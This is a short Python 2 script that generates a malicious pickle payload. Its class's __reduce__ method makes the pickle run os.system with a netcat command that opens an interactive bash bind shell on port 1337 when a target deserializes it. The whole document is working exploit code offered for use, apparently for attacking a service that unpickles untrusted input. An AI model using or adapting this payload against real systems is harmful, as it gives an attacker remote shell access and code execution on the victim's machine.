import cPickle
import os

class Damn(object):
	def __reduce__(self):
		return (os.system,("nc -c '/bin/bash -i' -l -p 1337",))
z=Damn()
print cPickle.dumps(z)